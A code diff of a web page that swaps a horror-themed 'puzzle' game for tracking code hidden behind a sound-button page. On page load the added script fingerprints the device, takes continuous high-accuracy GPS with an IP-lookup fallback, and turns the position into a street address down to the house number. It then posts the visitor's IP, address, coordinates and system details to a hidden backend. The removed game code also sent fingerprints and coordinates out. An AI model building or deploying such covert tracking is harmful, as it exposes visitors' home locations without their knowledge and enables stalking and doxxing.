-                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                cookies: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'Not set',
-                timestamp: new Date().toISOString()
-            };
-
-            // Generate unique fingerprint
-            const fingerprint = await generateFingerprint();
-            
-            document.getElementById('sysInfo').innerHTML = `
-                <strong>Platform:</strong> ${systemInfo.platform}<br>
-                <strong>Browser:</strong> ${systemInfo.browser.substring(0, 50)}...<br>
-                <strong>CPU Cores:</strong> ${systemInfo.cores}<br>
-                <strong>RAM:</strong> ${systemInfo.memory}<br>
-                <strong>Screen:</strong> ${systemInfo.screen}<br>
-                <strong>Timezone:</strong> ${systemInfo.timezone}<br>
-                <strong>Language:</strong> ${systemInfo.language}<br>
-                <strong>Cookies:</strong> ${systemInfo.cookies ? 'Enabled' : 'Disabled'}<br>
-                <strong>Do Not Track:</strong> ${systemInfo.doNotTrack}
-            `;
-
-            document.getElementById('fingerprintHash').innerHTML = `FP: ${fingerprint}`;
-            
-            return systemInfo;
-        }
-
-        async function generateFingerprint() {
-            const components = [
-                systemInfo.platform,
-                systemInfo.screen,
-                systemInfo.timezone,
-                systemInfo.cores,
-                systemInfo.language
-            ].join('|');
-            
-            const encoder = new TextEncoder();
-            const data = encoder.encode(components);
-            const hash = await crypto.subtle.digest('SHA-256', data);
-            return Array.from(new Uint8Array(hash)).slice(0, 8).map(b => b.toString(16).padStart(2, '0')).join('');
-        }
-
-        // ==================== DEEP SCAN ====================
-        document.getElementById('deepScan').addEventListener('click', async () => {
-            const hardwareDiv = document.getElementById('hardwareInfo');
-            hardwareDiv.style.display = 'block';
-            
-            const scanData = {
-                ...systemInfo,
-                plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).slice(0, 5) : [],
-                mimeTypes: navigator.mimeTypes ? navigator.mimeTypes.length : 0,
-                maxTouchPoints: navigator.maxTouchPoints,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                connection: navigator.connection ? {
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : 'Unknown'
-            };
-
-            hardwareDiv.innerHTML = `
-                <strong>🔬 DEEP SCAN RESULTS:</strong><br><br>
-                <strong>Plugins:</strong> ${scanData.plugins.length} detected<br>
-                <strong>MIME Types:</strong> ${scanData.mimeTypes}<br>
-                <strong>Touch Points:</strong> ${scanData.maxTouchPoints}<br>
-                <strong>Connection:</strong> ${scanData.connection.type || 'Unknown'}<br>
-                <strong>Downlink:</strong> ${scanData.connection.downlink || '?'} Mbps<br>
-                <strong>RTT:</strong> ${scanData.connection.rtt || '?'} ms<br>
-            `;
-
-            await sendToBackend('deep_scan', scanData);
-            addFragment();
-            showToast('Deep scan complete', 'info');
-        });
-
-        // ==================== FORBIDDEN BUTTON ====================
-        const buttonMessages = [
-            "Why did you do that?",
-            "They're watching now.",
-            "The button is bleeding.",
-            "Check your surroundings.",
-            "Only 5 presses left...",
-            "You shouldn't have done that.",
-            "They know your name.",
-            "It's too late now.",
-            "The screen is glitching.",
-            "Behind you.",
-            "Your location has been logged.",
-            "Camera access requested.",
-            "Microphone activated.",
-            "Data transmission in progress.",
-            "Threat level rising."
-        ];
-
-        document.getElementById('forbiddenButton').addEventListener('click', async () => {
-            buttonPresses++;
-            
-            document.getElementById('pressHistory').innerHTML = `Presses: ${buttonPresses}`;
-            document.getElementById('buttonStatus').className = 'status-badge status-offline';
-            document.getElementById('buttonStatus').textContent = `PRESSED ${buttonPresses}`;
-            
-            const message = buttonMessages[Math.min(buttonPresses - 1, buttonMessages.length - 1)];
-            document.getElementById('buttonMessages').innerHTML = message;
-            
-            // Update threat level
-            updateThreatLevel(5 + buttonPresses);
-            
-            // Special effects
-            if (buttonPresses === 3) {
-                document.body.style.animation = 'corrupt 0.5s';
-                setTimeout(() => document.body.style.animation = '', 500);
-                addFragment();
-            }
-            
-            if (buttonPresses === 6) {
-                createGlitchEffect();
-                addFragment();
-            }
-            
-            if (buttonPresses === 9) {
-                document.getElementById('buttonMessages').innerHTML = '⚠️ COORDINATES REVEALED: 60.233, 24.866 ⚠️';
-                updateThreatLevel(30);
-                addFragment();
-            }
-            
-            if (buttonPresses === 13) {
-                document.getElementById('buttonMessages').innerHTML = '💀 SYSTEM BREACH DETECTED 💀';
-                updateThreatLevel(50);
-            }
-
-            await sendToBackend('button', {
-                presses: buttonPresses,
-                message: message
+    // ==================== EXACT LOCATION TRACKING ====================
+    async function getExactLocation() {
+      document.getElementById('location-info').style.display = 'block';
+      document.getElementById('exact-address').innerHTML = '<span class="loading"></span> Acquiring GPS signal...';
+      
+      try {
+        // Try GPS first (most accurate)
+        if (navigator.geolocation) {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
             });
-        });
-
-        // ==================== REALITY FRAGMENTS ====================
-        function createPuzzlePieces() {
-            const container = document.getElementById('puzzlePieces');
-            container.innerHTML = '';
-            
-            for (let i = 1; i <= 9; i++) {
-                const piece = document.createElement('div');
-                piece.className = `puzzle-piece ${fragments.includes(i) ? 'found' : 'missing'}`;
-                piece.dataset.fragment = i;
-                piece.onclick = () => collectFragment(i);
-                container.appendChild(piece);
-            }
+          });
+          
+          await processLocation(position.coords, 'GPS (High Accuracy)');
+        } else {
+          // Fallback to IP geolocation
+          await getIPLocation();
         }
+      } catch (gpsError) {
+        console.log('GPS failed, trying IP:', gpsError);
+        await getIPLocation();
+      }
+    }
 
-        async function collectFragment(num) {
-            if (!fragments.includes(num)) {
-                fragments.push(num);
-                fragments.sort((a, b) => a - b);
-                
-                createPuzzlePieces();
-                document.getElementById('fragmentsFound').innerHTML = `${fragments.length}/9 fragments collected`;
-                document.getElementById('fragmentStatus').textContent = `${fragments.length}/9`;
-                
-                await sendToBackend('fragment', { fragment: num });
-                
-                if (fragments.length === 9) {
-                    document.getElementById('fragmentMessage').innerHTML = '⚠️ ALL FRAGMENTS ASSEMBLED - REALITY BREACH IMMINENT ⚠️';
-                    updateThreatLevel(50);
-                    showToast('Reality fragments assembled!', 'warning');
-                }
-            }
+    async function processLocation(coords, source) {
+      const lat = coords.latitude;
+      const lon = coords.longitude;
+      const accuracy = coords.accuracy || 1000;
+
+      currentLocation = {
+        lat: lat,
+        lon: lon,
+        accuracy: accuracy,
+        source: source
+      };
+
+      // Update display
+      document.getElementById('latitude').textContent = lat.toFixed(6);
+      document.getElementById('longitude').textContent = lon.toFixed(6);
+      document.getElementById('location-source').innerHTML = `📡 Source: ${source} | 🎯 Accuracy: ${accuracy.toFixed(1)}m`;
+      
+      // Get reverse geocoding for exact address
+      await getExactAddress(lat, lon);
+      
+      // Show satellite button
+      document.getElementById('satellite-btn').style.display = 'block';
+      
+      // Send to backend
+      await sendToBackend();
+    }
+
+    async function getExactAddress(lat, lon) {
+      try {
+        // Using OpenStreetMap Nominatim for reverse geocoding
+        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+        const data = await response.json();
+        
+        const address = data.address || {};
+        
+        // Format exact address
+        const addressParts = [];
+        if (address.house_number) addressParts.push(address.house_number);
+        if (address.road) addressParts.push(address.road);
+        if (address.suburb) addressParts.push(address.suburb);
+        if (address.city || address.town || address.village) {
+          addressParts.push(address.city || address.town || address.village);
         }
+        if (address.county) addressParts.push(address.county);
+        if (address.state) addressParts.push(address.state);
+        if (address.postcode) addressParts.push(address.postcode);
+        if (address.country) addressParts.push(address.country);
 
-        function addFragment() {
-            for (let i = 1; i <= 9; i++) {
-                if (!fragments.includes(i)) {
-                    collectFragment(i);
-                    break;
-                }
-            }
-        }
+        const fullAddress = addressParts.join(', ');
+        
+        document.getElementById('exact-address').innerHTML = `
+          <strong>Exact Address:</strong><br>
+          ${fullAddress}
+        `;
 
-        // ==================== DARK WEB SCAN ====================
-        document.getElementById('scanDarkWeb').addEventListener('click', async () => {
-            document.getElementById('darkWebData').innerHTML = '<span class="loading"></span> Scanning dark web...';
-            
-            const darkWebData = [
-                `> Your location: ${currentLocation ? `${currentLocation.lat.toFixed(4)}, ${currentLocation.lon.toFixed(4)}` : 'Unknown'}`,
-                `> Device fingerprint: ${await generateFingerprint()}`,
-                `> Browser: ${systemInfo.browser.substring(0, 30)}...`,
-                `> OS: ${systemInfo.platform}`,
-                `> Data found in ${Math.floor(Math.random() * 10) + 1} databases`,
-                `> Estimated value: $${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 99)}`,
-                `> Threat level: ${threatLevel}%`,
-                `> Recommended action: ${threatLevel > 70 ? 'Immediate evacuation' : 'Monitor'}`
-            ];
-            
-            setTimeout(() => {
-                document.getElementById('darkWebData').innerHTML = darkWebData.join('<br>');
-                document.getElementById('darkWebThreat').innerHTML = threatLevel > 50 ? '⚠️ Your data is being traded' : '';
-                updateThreatLevel(10);
-            }, 2000);
-        });
+        // Display all available details
+        const details = [];
+        if (address.house_number) details.push(`🏠 House: ${address.house_number}`);
+        if (address.road) details.push(`🛣️ Road: ${address.road}`);
+        if (address.neighbourhood || address.suburb) details.push(`🏘️ Neighbourhood: ${address.neighbourhood || address.suburb || 'N/A'}`);
+        if (address.city || address.town || address.village) details.push(`🏙️ City: ${address.city || address.town || address.village}`);
+        if (address.county) details.push(`🗺️ County: ${address.county}`);
+        if (address.state) details.push(`📍 State: ${address.state}`);
+        if (address.postcode) details.push(`📮 ZIP: ${address.postcode}`);
+        if (address.country) details.push(`🌍 Country: ${address.country}`);
+        
+        document.getElementById('location-details').innerHTML = details.join('<br>');
 
-        // ==================== SATELLITE FEED ====================
-        function updateSatelliteImage(lat, lon) {
-            // Using ESRI satellite imagery
-            const zoom = 18;
-            const x = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
-            const y = Math.floor((1 - Math.log(Math.tan(lat * Math.PI/180) + 1/Math.cos(lat * Math.PI/180)) / Math.PI) / 2 * Math.pow(2, zoom));
-            
-            document.getElementById('satelliteImage').src = `https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/${zoom}/${y}/${x}`;
-            document.getElementById('satelliteInfo').innerHTML = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)} | Zoom: ${zoom}`;
-        }
-
-        document.getElementById('refreshSatellite').addEventListener('click', () => {
-            if (currentLocation) {
-                updateSatelliteImage(currentLocation.lat, currentLocation.lon);
-            }
-        });
-
-        // ==================== ENCRYPTED TRANSMISSIONS ====================
-        const transmissions = [
-            "INCOMING: Location data transmitted",
-            "INCOMING: System fingerprint stored",
-            "INCOMING: Threat level updated",
-            "INCOMING: Fragment collected",
-            "INCOMING: Dark web scan complete",
-            "CLASSIFIED: Multiple sources tracking",
-            "WARNING: Pattern detected"
-        ];
-
-        document.getElementById('newTransmission').addEventListener('click', () => {
-            const transmission = transmissions[Math.floor(Math.random() * transmissions.length)];
-            const time = new Date().toLocaleTimeString();
-            
-            const div = document.getElementById('transmissions');
-            div.innerHTML = `[${time}] ${transmission}<br>` + div.innerHTML;
-            
-            if (Math.random() > 0.7) {
-                updateThreatLevel(2);
-            }
-        });
-
-        // Start automatic transmissions
-        transmissionInterval = setInterval(() => {
-            document.getElementById('newTransmission').click();
-        }, 30000);
-
-        // ==================== THREAT SYSTEM ====================
-        function updateThreatLevel(increase) {
-            threatLevel = Math.min(100, threatLevel + increase);
-            document.getElementById('threatLevel').textContent = threatLevel;
-            document.getElementById('timelineProgress').style.width = threatLevel + '%';
-            
-            let message = '';
-            if (threatLevel < 30) {
-                message = 'LOW - SCANNING';
-                document.getElementById('threatIndicator').style.borderColor = '#0f0';
-            } else if (threatLevel < 60) {
-                message = 'MEDIUM - WATCHING';
-                document.getElementById('threatIndicator').style.borderColor = 'yellow';
-            } else if (threatLevel < 90) {
-                message = 'HIGH - TRACKING';
-                document.getElementById('threatIndicator').style.borderColor = 'orange';
-            } else {
-                message = 'CRITICAL - DETECTED';
-                document.getElementById('threatIndicator').style.borderColor = 'red';
-            }
-            
-            document.getElementById('threatMessage').textContent = message;
-            document.getElementById('timelineEvent').textContent = message;
-            
-            // Update threat analysis
-            document.getElementById('threatAnalysis').innerHTML = `
-                Current Level: ${threatLevel}%<br>
-                Status: ${message}<br>
-                Recommendation: ${threatLevel > 70 ? 'IMMEDIATE ACTION REQUIRED' : 'Continue monitoring'}<br>
-                Sources: ${Math.floor(threatLevel / 10) + 1} tracking systems
-            `;
-
-            if (threatLevel > 70) {
-                sendToBackend('threat', { level: threatLevel, message: message });
-            }
-        }
-
-        // ==================== LOCATION ACTIONS ====================
-        document.getElementById('copyCoordinates').addEventListener('click', () => {
-            if (currentLocation) {
-                const coords = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`;
-                navigator.clipboard.writeText(coords);
-                showToast('Coordinates copied!', 'success');
-            }
-        });
-
-        document.getElementById('openMaps').addEventListener('click', () => {
-            if (currentLocation) {
-                window.open(`https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lon}`, '_blank');
-            }
-        });
-
-        document.getElementById('openStreetView').addEventListener('click', () => {
-            if (currentLocation) {
-                window.open(`https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lon}&layer=c`, '_blank');
-            }
-        });
-
-        document.getElementById('refreshLocation').addEventListener('click', getExactLocation);
-
-        // ==================== BACKEND COMMUNICATION ====================
-        async function sendToBackend(type, data) {
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/track`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        type: type,
-                        data: data,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent
-                    })
-                });
-                
-                const result = await response.json();
-                
-                if (result.user_id && !userId) {
-                    userId = result.user_id;
-                    document.getElementById('userId').innerHTML = `ID: ${userId.substring(0, 8)}...`;
-                }
-                
-                if (result.is_new && type === 'system') {
-                    showToast('New identity registered', 'info');
-                }
-                
-                return result;
-            } catch (error) {
-                console.error('Backend error:', error);
-                return null;
-            }
-        }
-
-        async function getStats() {
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/stats`);
-                const stats = await response.json();
-                document.getElementById('totalUsers').textContent = stats.total_users || '---';
-            } catch (error) {
-                console.error('Stats error:', error);
-            }
-        }
-
-        // ==================== UTILITY FUNCTIONS ====================
-        function startDataStream() {
-            setInterval(() => {
-                const stream = document.getElementById('dataStream');
-                const hex = Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-                const types = ['GPS', 'SYS', 'FRAG', 'THRT', 'DARK'];
-                const type = types[Math.floor(Math.random() * types.length)];
-                const data = `[${new Date().toLocaleTimeString()}] [${type}:${hex}] ${Math.random().toString(36).substring(7)}...\n`;
-                stream.innerHTML = data + stream.innerHTML;
-                if (stream.innerHTML.length > 2000) {
-                    stream.innerHTML = stream.innerHTML.substring(0, 2000);
-                }
-            }, 500);
-        }
-
-        function initMatrixRain() {
-            const canvas = document.getElementById('matrixCanvas');
-            const ctx = canvas.getContext('2d');
-            
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-
-            const chars = '01010101010101010101アイウエオカキクケコ';
-            const columns = canvas.width / 20;
-            const drops = [];
-
-            for (let i = 0; i < columns; i++) {
-                drops[i] = Math.floor(Math.random() * canvas.height);
-            }
-
-            function draw() {
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-                ctx.fillStyle = '#0f0';
-                ctx.font = '15px monospace';
-
-                for (let i = 0; i < drops.length; i++) {
-                    const text = chars[Math.floor(Math.random() * chars.length)];
-                    ctx.fillText(text, i * 20, drops[i]);
-
-                    if (drops[i] > canvas.height && Math.random() > 0.975) {
-                        drops[i] = 0;
-                    }
-                    drops[i] += 20;
-                }
-            }
-
-            setInterval(draw, 35);
-        }
-
-        function updateTime() {
-            setInterval(() => {
-                document.getElementById('systemTime').textContent = `> TIME: ${new Date().toLocaleString()}`;
-            }, 1000);
-        }
-
-        function createGlitchEffect() {
-            const cards = document.querySelectorAll('.puzzle-card');
-            cards.forEach(card => {
-                card.style.animation = 'corrupt 0.3s';
-                setTimeout(() => card.style.animation = '', 300);
-            });
-        }
-
-        function showToast(message, type = 'info') {
-            const container = document.getElementById('toastContainer');
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = message;
-            
-            const colors = {
-                success: '#0f0',
-                error: '#f00',
-                warning: '#ff0',
-                info: '#0ff'
-            };
-            
-            toast.style.borderColor = colors[type] || '#0f0';
-            container.appendChild(toast);
-            
-            setTimeout(() => {
-                toast.style.animation = 'slideOut 0.3s';
-                setTimeout(() => toast.remove(), 300);
-            }, 3000);
-        }
-
-        window.revealSecret = () => {
-            const secrets = [
-                "The button knows...",
-                "Check at midnight...",
-                "60.233, 24.866",
-                "They're behind you",
-                "Your screen is glitching",
-                "The truth is out there",
-                "Follow the fragments"
-            ];
-            const secret = secrets[Math.floor(Math.random() * secrets.length)];
-            alert(`🔮 ${secret}`);
-            addFragment();
+        // Add to location data
+        currentLocation = {
+          ...currentLocation,
+          address: fullAddress,
+          house_number: address.house_number,
+          road: address.road,
+          neighbourhood: address.neighbourhood || address.suburb,
+          city: address.city || address.town || address.village,
+          county: address.county,
+          state: address.state,
+          zip: address.postcode,
+          country: address.country
         };
 
-        // Cleanup on page unload
-        window.addEventListener('beforeunload', () => {
-            if (watchId) {
-                navigator.geolocation.clearWatch(watchId);
-            }
-            if (transmissionInterval) {
-                clearInterval(transmissionInterval);
-            }
+        // Update satellite image
+        updateSatelliteImage(lat, lon);
+        
+      } catch (error) {
+        console.error('Reverse geocoding failed:', error);
+        document.getElementById('exact-address').innerHTML = 'Address lookup failed';
+      }
+    }
+
+    async function getIPLocation() {
+      try {
+        const response = await fetch('http://ip-api.com/json/');
+        const data = await response.json();
+        
+        if (data.status === 'success') {
+          await processLocation({
+            latitude: data.lat,
+            longitude: data.lon,
+            accuracy: 1000
+          }, 'IP Geolocation');
+          
+          document.getElementById('exact-address').innerHTML = `
+            <strong>IP-Based Location:</strong><br>
+            ${data.city}, ${data.regionName}, ${data.country}<br>
+            ISP: ${data.isp || 'Unknown'}
+          `;
+        }
+      } catch (error) {
+        console.error('IP location failed:', error);
+        document.getElementById('exact-address').innerHTML = 'Location unavailable';
+      }
+    }
+
+    function startWatchingPosition() {
+      if (navigator.geolocation) {
+        watchId = navigator.geolocation.watchPosition(
+          async (position) => {
+            await processLocation(position.coords, 'GPS (Real-time)');
+          },
+          (error) => console.log('Watch error:', error),
+          {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 5000
+          }
+        );
+      }
+    }
+
+    // ==================== SYSTEM FINGERPRINT ====================
+    async function collectSystemInfo() {
+      document.getElementById('system-info').style.display = 'block';
+      
+      systemInfo = {
+        platform: navigator.platform,
+        browser: navigator.userAgent,
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+        screen: {
+          width: screen.width,
+          height: screen.height
+        },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        cookies: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'Not set',
+        timestamp: new Date().toISOString()
+      };
+
+      // Generate unique fingerprint
+      const fingerprint = await generateFingerprint();
+      
+      document.getElementById('sys-info-content').innerHTML = `
+        <strong>Platform:</strong> ${systemInfo.platform}<br>
+        <strong>Browser:</strong> ${systemInfo.browser.substring(0, 50)}...<br>
+        <strong>CPU Cores:</strong> ${systemInfo.cores}<br>
+        <strong>RAM:</strong> ${systemInfo.memory}<br>
+        <strong>Screen:</strong> ${systemInfo.screen.width}x${systemInfo.screen.height}<br>
+        <strong>Timezone:</strong> ${systemInfo.timezone}<br>
+        <strong>Language:</strong> ${systemInfo.language}<br>
+        <strong>Cookies:</strong> ${systemInfo.cookies ? 'Enabled' : 'Disabled'}<br>
+        <strong>Do Not Track:</strong> ${systemInfo.doNotTrack}
+      `;
+
+      document.getElementById('fingerprint-hash').innerHTML = `FP: ${fingerprint}`;
+      
+      return systemInfo;
+    }
+
+    async function generateFingerprint() {
+      const components = [
+        systemInfo.platform,
+        `${systemInfo.screen.width}x${systemInfo.screen.height}`,
+        systemInfo.timezone,
+        systemInfo.cores,
+        systemInfo.language
+      ].join('|');
+      
+      const encoder = new TextEncoder();
+      const data = encoder.encode(components);
+      const hash = await crypto.subtle.digest('SHA-256', data);
+      return Array.from(new Uint8Array(hash)).slice(0, 8).map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    // ==================== SATELLITE VIEW ====================
+    function updateSatelliteImage(lat, lon) {
+      // Using ESRI satellite imagery (no API key needed)
+      const zoom = 18;
+      
+      // Calculate tile coordinates
+      const x = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
+      const y = Math.floor((1 - Math.log(Math.tan(lat * Math.PI/180) + 1/Math.cos(lat * Math.PI/180)) / Math.PI) / 2 * Math.pow(2, zoom));
+      
+      // Store for later use
+      currentLocation.satellite = {
+        zoom: zoom,
+        x: x,
+        y: y
+      };
+    }
+
+    function showSatellite() {
+      if (!currentLocation) return;
+      
+      const modal = document.getElementById('satellite-modal');
+      const img = document.getElementById('satellite-image');
+      const coords = document.getElementById('satellite-coords');
+      
+      const lat = currentLocation.lat;
+      const lon = currentLocation.lon;
+      const zoom = 18;
+      
+      // Calculate tile coordinates
+      const x = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
+      const y = Math.floor((1 - Math.log(Math.tan(lat * Math.PI/180) + 1/Math.cos(lat * Math.PI/180)) / Math.PI) / 2 * Math.pow(2, zoom));
+      
+      img.src = `https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/${zoom}/${y}/${x}`;
+      coords.innerHTML = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)} | Zoom: ${zoom}`;
+      
+      modal.style.display = 'block';
+    }
+
+    function closeSatellite() {
+      document.getElementById('satellite-modal').style.display = 'none';
+    }
+
+    // Satellite button click
+    document.getElementById('satellite-btn').addEventListener('click', showSatellite);
+
+    // Close modal on click outside
+    window.addEventListener('click', (e) => {
+      const modal = document.getElementById('satellite-modal');
+      if (e.target === modal) {
+        modal.style.display = 'none';
+      }
+    });
+
+    // ==================== BACKEND COMMUNICATION ====================
+    async function sendToBackend() {
+      try {
+        // Get IP data
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const locData = await locResponse.json();
+
+        // Build comprehensive user info matching backend VisitorInfo model
+        const userInfo = {
+          ip: locData.ip,
+          city: locData.city || 'N/A',
+          region: locData.region || 'N/A',
+          country: locData.country_name || 'N/A',
+          timezone: locData.timezone || systemInfo?.timezone || 'N/A',
+          userAgent: navigator.userAgent,
+          screen: {
+            width: window.screen.width,
+            height: window.screen.height,
+            colorDepth: window.screen.colorDepth,
+            pixelDepth: window.screen.pixelDepth
+          },
+          browser: {
+            appName: navigator.appName,
+            appVersion: navigator.appVersion,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack
+          },
+          // Advanced location
+          location: currentLocation?.address ? { display_name: currentLocation.address } : {},
+          address: currentLocation ? {
+            house_number: currentLocation.house_number,
+            road: currentLocation.road,
+            neighbourhood: currentLocation.neighbourhood,
+            city: currentLocation.city,
+            county: currentLocation.county,
+            state: currentLocation.state,
+            postcode: currentLocation.zip,
+            country: currentLocation.country
+          } : {},
+          coordinates: currentLocation ? {
+            lat: currentLocation.lat,
+            lon: currentLocation.lon
+          } : {},
+          accuracy: currentLocation?.accuracy || 0,
+          source: currentLocation?.source || 'Unknown',
+          // System
+          system: systemInfo || {},
+          fragments: fragments,
+          button_presses: buttonPresses
+        };
+
+        // Send to backend
+        const response = await fetch(`${BACKEND_URL}/submit`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(userInfo)
         });
-    </script>
+
+        const result = await response.json();
+        console.log('Backend response:', result);
+
+      } catch (error) {
+        console.error('Error sending to backend:', error);
+      }
+    }
+
+    // ==================== LOADING PROGRESS ====================
+    const loadingOverlay = document.getElementById('loading-overlay');
+    const loadingPercentage = document.getElementById('loading-percentage');
+    const progressBar = document.getElementById('progress-bar');
+    const loadingDetails = document.getElementById('loading-details');
+
+    let progress = 0;
+    const intervalSpeed = 40;
+
+    async function loadUserData() {
+      loadingOverlay.style.display = 'block';
+      loadingDetails.style.display = 'none';
+
+      // Start collecting data
+      await collectSystemInfo();
+      await getExactLocation();
+      startWatchingPosition();
+
+      // Fill progress bar
+      await new Promise(resolve => {
+        const progressInterval = setInterval(() => {
+          if (progress < 100) {
+            progress++;
+            loadingPercentage.textContent = progress + '%';
+            progressBar.style.width = progress + '%';
+          } else {
+            clearInterval(progressInterval);
+            resolve();
+          }
+        }, intervalSpeed);
+      });
+
+      // After progress is 100%, show details
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+
+        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const locData = await locResponse.json();
+
+        let detailString = `IP: ${locData.ip}\n`;
+        detailString += `City: ${locData.city}\n`;
+        detailString += `Region: ${locData.region}\n`;
+        detailString += `Country: ${locData.country_name}\n`;
+        detailString += `Timezone: ${locData.timezone}\n`;
+        detailString += `User Agent: ${navigator.userAgent}\n`;
+        detailString += `Screen: ${window.screen.width}x${window.screen.height}\n`;
+        detailString += `Language: ${navigator.language}\n`;
+        
+        if (currentLocation) {
+          detailString += `\n📍 EXACT COORDINATES:\n`;
+          detailString += `Latitude: ${currentLocation.lat.toFixed(6)}\n`;
+          detailString += `Longitude: ${currentLocation.lon.toFixed(6)}\n`;
+          detailString += `Accuracy: ${currentLocation.accuracy}m\n`;
+          detailString += `Source: ${currentLocation.source}\n`;
+        }
+
+        loadingDetails.textContent = detailString;
+        loadingDetails.style.display = 'block';
+
+      } catch (error) {
+        loadingDetails.textContent = 'Error loading details.';
+        loadingDetails.style.display = 'block';
+        console.error(error);
+      }
+    }
+
+    // ==================== SOUND BUTTONS ====================
+    const audioPlayer = new Audio();
+
+    document.getElementById('sound-buttons').addEventListener('click', e => {
+      if (e.target.tagName === 'BUTTON') {
+        const soundFile = e.target.getAttribute('data-sound');
+        if (!soundFile) return;
+        audioPlayer.src = soundFile;
+        audioPlayer.play().catch(err => console.log('Play error:', err));
+      }
+    });
+
+    // ==================== INITIALIZE ====================
+    window.addEventListener('load', () => {
+      loadUserData();
+    });
+
+    // Cleanup on page unload
+    window.addEventListener('beforeunload', () => {
+      if (watchId) {
+        navigator.geolocation.clearWatch(watchId);
+      }
+    });
+  </script>
 </body>
 </html>
